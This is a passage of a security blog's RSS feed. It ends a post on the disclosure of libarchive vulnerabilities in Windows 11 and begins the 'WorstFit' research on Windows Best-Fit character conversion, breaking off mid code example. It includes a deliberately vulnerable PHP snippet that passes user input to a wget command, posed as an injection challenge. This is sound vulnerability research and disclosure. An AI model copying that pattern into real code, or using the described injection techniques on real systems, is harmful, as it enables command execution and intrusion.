  &lt;/li&gt;
  &lt;li&gt;OOB read in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_audio&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 3/20&lt;/li&gt;
      &lt;li&gt;Fixed on 4/29&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;OOB read in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_delta&lt;/code&gt;
    &lt;ul&gt;
      &lt;li&gt;Reported to libarchive on 3/20&lt;/li&gt;
      &lt;li&gt;Fixed on 4/29&lt;/li&gt;
      &lt;li&gt;Closed on 9/28&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;After several months following the reports, these vulnerabilities were finally patched, by which time it was already September.
&lt;img src=&quot;/assets/img/blog/20250212/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;the-half-day-cycle-of-repetition&quot;&gt;The “Half-day” Cycle of Repetition&lt;/h4&gt;

&lt;p&gt;The most severe one is CVE-2024-26256, a vulnerability we reported to Microsoft, which was already patched on Windows in April.
&lt;img src=&quot;/assets/img/blog/20250212/68.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we reported the vulnerability CVE-2024-26256 in March, we asked MSRC whether they would submit the patch to libarchive’s GitHub repository, but we didn’t receive a response initially. After Microsoft patched CVE-2024-26256, we followed up to confirm if they had shared the vulnerability information with libarchive maintainers. MSRC replied, “If you wish, we encourage you to open a separate GitHub issue.” To avoid a “Half-day” situation, we immediately created an issue in libarchive’s Security Advisory after receiving their message:
&lt;img src=&quot;/assets/img/blog/20250212/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, the “Half-day” situation still occurred due to a lack of response. In July, we submitted a PR to port Microsoft’s patch to libarchive. While we weren’t sure if this was the best fix, it was certainly better than leaving the issue unaddressed. As a result, history repeated itself, and we found ourselves stuck in a “Half-day” scenario again, from April until the patch was finally completed in September.&lt;/p&gt;

&lt;h4 id=&quot;the-remaining-two-0-days&quot;&gt;The Remaining Two 0-Days&lt;/h4&gt;

&lt;p&gt;Attentive readers may have already noticed that the issues we reported are not listed under the “Published” tab but rather under “Closed”:
&lt;img src=&quot;/assets/img/blog/20250212/70.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In addition to CVE-2024-26256, which we mentioned earlier, the other two vulnerabilities are out-of-bounds read issues that had not been assigned CVE identifiers at the time. When a patch is linked to an existing CVE number, it is generally understood to be a security fix. However, the other two vulnerabilities were not publicly disclosed. Given that libarchive is widely used across many software applications and services, many users may be unaware they are relying on it. The dependency chains within such software can be large and intricate. If developers or end-users do not recognize that a patch addresses a security issue, the fix may propagate slowly through the dependency chain, significantly increasing the risk exposure.&lt;/p&gt;

&lt;p&gt;As a result, after confirming that libarchive had closed the issue, we promptly applied for CVE identifiers for these vulnerabilities. The two vulnerabilities were assigned &lt;a href=&quot;https://github.com/advisories/GHSA-rmj4-vvpv-4m33&quot;&gt;CVE-2024-48957&lt;/a&gt; and &lt;a href=&quot;https://github.com/advisories/GHSA-9mw4-2ppr-4mcg&quot;&gt;CVE-2024-48958&lt;/a&gt;. By the time these were published, it was already October, six months after the patch had been released in April.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This article discusses the vulnerabilities and notable characteristics introduced when Windows adopted libarchive to support additional archive file formats.&lt;/p&gt;

&lt;p&gt;We also successfully exploited what we consider “Half-day” vulnerabilities in ClickHouse. These “Half-day” vulnerabilities arise from the fact that after Windows forked libarchive and compiled it into the closed-source archiveint.dll, it failed to promptly inform the libarchive maintainers or contribute the patch back to the upstream repository, leading to the creation of the “Half-day” vulnerability.&lt;/p&gt;

&lt;p&gt;The delayed fix in the upstream repository can be attributed to communication delays and the absence of a publicly available patch. The maintainers were only able to address the issue after receiving the report, by which point the forked version had already been patched. Therefore, after patching its forked version of libarchive, Microsoft should have not only notified the original maintainers but also submitted a Pull Request to the upstream repository to facilitate the fix.&lt;/p&gt;

&lt;p&gt;Libarchive maintainers are volunteers who may be unpaid. The open-source ethos encourages everyone to “share, collaborate, and contribute” (and much more). Thus, we believe that researchers should not only provide vulnerability analysis and PoCs but also actively propose fixes to help preserve the security and quality of open-source software when reporting vulnerabilities.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en/</link>
                <guid>https://devco.re/blog/2025/02/12/from-convenience-to-contagion-the-half-day-threat-and-libarchive-vulnerabilities-lurking-in-windows-11-en</guid>
                <pubDate>Wed, 12 Feb 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI!</title>
                <description>&lt;style&gt;
    .language-plaintext {
        background-color: rgba(0, 0, 0, 0.04);
        padding: 0.2em;
        font-size: 85%;
    }

    .highlight {
        border-left: 2px solid #44D62C !important;
    }
&lt;/style&gt;

&lt;p&gt;&lt;em&gt;Author: &lt;a href=&quot;https://x.com/orange_8361&quot;&gt;Orange&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://x.com/_splitline_&quot;&gt;Splitline&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The research unveils a new attack surface in Windows by exploiting &lt;strong&gt;Best-Fit&lt;/strong&gt;, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!&lt;/p&gt;

&lt;p&gt;Given that the root cause spans compiler behavior, C/C++ runtime and developer’s mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.&lt;/p&gt;

&lt;p&gt;Get the latest update and slides on our website!🔥 → &lt;a href=&quot;https://worst.fit/&quot;&gt;https://worst.fit/&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Let’s imagine that: you’re a pentester, and your target website is running the following code. Can you pop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; with that? &lt;!-- You can have a quick try on your own. --&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?&lt;/p&gt;

&lt;p&gt;Well, today, we would like to present a new technique to break through it!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;#outline&quot;&gt;Outline&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit – The novel attack surface on Windows&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;🔥 The nightmare of East-Asia - CVE-2024-4577&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-filename-smuggling&quot;&gt;🔥 Filename Smuggling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-argument-splitting&quot;&gt;🔥 Argument Splitting&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#-environment-variable-confusion&quot;&gt;🔥 Environment Variable Confusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk–or Dawn–of the WorstFit&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;#epilogue&quot;&gt;Epilogue&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&quot;#mitigations&quot;&gt;Mitigations&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/h2&gt;

&lt;p&gt;If you are a Windows user, you’re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK &lt;abbr title=&quot;CHARACTERS&quot;&gt;匚卄八尺八匚ㄒヨ尺丂&lt;/abbr&gt; pretty much anywhere — like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?&lt;/p&gt;

&lt;p&gt;Well, to describe this, let’s dive into the history of encoding in Windows first to understand how it handles.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/h3&gt;

&lt;p&gt;Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Code Page&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1250&lt;/td&gt;
      &lt;td&gt;Central / Eastern European languages (e.g., Polish, Czech)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1251&lt;/td&gt;
      &lt;td&gt;Cyrillic-based languages (e.g., Russian, Bulgarian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1252&lt;/td&gt;
      &lt;td&gt;Western European languages (e.g., English, German, French)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1253&lt;/td&gt;
      &lt;td&gt;Greek&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1254&lt;/td&gt;
      &lt;td&gt;Turkish&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1255&lt;/td&gt;
      &lt;td&gt;Hebrew&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1256&lt;/td&gt;
      &lt;td&gt;Arabic&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1257&lt;/td&gt;
      &lt;td&gt;Baltic languages (e.g., Estonian, Latvian, Lithuanian)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1258&lt;/td&gt;
      &lt;td&gt;Vietnamese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;932&lt;/td&gt;
      &lt;td&gt;Japanese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;936&lt;/td&gt;
      &lt;td&gt;Simplified Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;949&lt;/td&gt;
      &lt;td&gt;Korean&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;950&lt;/td&gt;
      &lt;td&gt;Traditional Chinese&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;874&lt;/td&gt;
      &lt;td&gt;Thai&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, I’d probably end up with a scrambled mess of &lt;a href=&quot;https://en.wikipedia.org/wiki/Mojibake&quot;&gt;mojibake&lt;/a&gt; because my code page 950 system couldn’t properly interpret the Japanese 932 code page.&lt;/p&gt;

&lt;p&gt;To handle different encoding needs, Windows doesn’t rely on just one type of code page — there are actually two:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ACP&lt;/strong&gt; (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios we’ll examine.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;OEMCP&lt;/strong&gt; (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To check which ACP (ANSI code page) you’re using, consider these methods:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Using PowerShell&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OutputEncoding.WindowsCodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;From the Registry&lt;/strong&gt;
    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Additionally, you might also heard of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt;&lt;/a&gt;. However, be aware that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt; displays the &lt;strong&gt;OEMCP&lt;/strong&gt;  rather than the ACP, which is the focus of our research here.&lt;/p&gt;

&lt;h3 id=&quot;the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/h3&gt;
&lt;p&gt;To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.&lt;/p&gt;

&lt;p&gt;Initially, Windows used UCS-2 for Unicode but soon upgraded to &lt;strong&gt;UTF-16&lt;/strong&gt;, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to &lt;strong&gt;wide characters&lt;/strong&gt; for core APIs like file systems, system information, and text processing.&lt;/p&gt;

&lt;p&gt;Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: &lt;strong&gt;UTF-8&lt;/strong&gt;? Well, it’s already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isn’t enabled by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/h3&gt;

&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still needs to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI APIs&lt;/strong&gt;: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Unicode APIs&lt;/strong&gt;: A Unicode version with the letter “W” postfix used to indicate “wide (character)”. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.&lt;/p&gt;

&lt;p&gt;It sounds perfect – But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren’t they fundamentally different?&lt;/p&gt;

&lt;p&gt;To illustrate this, let’s explore an example. Imagine we’re on an English (&lt;strong&gt;Windows-1252&lt;/strong&gt; code page) system with an environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENV=Hello&lt;/code&gt; stored in the system. The data is internally stored as &lt;strong&gt;UTF-16&lt;/strong&gt; (wide character format), but we can retrieve it using both Unicode and ANSI APIs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4800 6500 6C00 6C00 6F00&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; — &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48 65 6C 6C 6F&lt;/code&gt; in ANSI).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For the &lt;strong&gt;Unicode API&lt;/strong&gt;, there’s no problem—Unicode in, Unicode out, with no conversion needed. For the &lt;strong&gt;ANSI API&lt;/strong&gt;, Windows applies an implicit conversion by calling &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt;&lt;/a&gt; (or sometimes &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WideCharToMultiByte&lt;/code&gt;&lt;/a&gt;) to convert the original Unicode string to an ANSI string. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; consists only of ASCII characters, everything works perfectly and as expected.&lt;/p&gt;

&lt;p&gt;But what happens if the environment variable contains a more complex string, like &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√π⁷≤∞&lt;/code&gt;&lt;/strong&gt;, with a lot of non-ASCII characters?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;√π⁷≤∞&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1a22 c003 7720 6422 1e22&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;strong&gt;Unicode API&lt;/strong&gt; correctly returns the original string as we expected.&lt;/p&gt;

&lt;p&gt;Now, what happens with the ANSI API? Are you able to guess the result?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; — &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 70 37 3D 38&lt;/code&gt; in ANSI) 🤯&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yep, the output is &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vp7=8&lt;/code&gt;&lt;/strong&gt;. A strange result, right? I guess you can’t even figure out the connection between the original characters and their character codes!&lt;/p&gt;

&lt;p&gt;This bizarre transformation is what’s known as &lt;strong&gt;“Best-Fit”&lt;/strong&gt; behavior. As a result, the original string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√π⁷≤∞&lt;/code&gt; transforms into a nonsensical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt;. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.&lt;/p&gt;

&lt;p&gt;And actually, it’s not just when using Windows APIs directly — this behaviour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
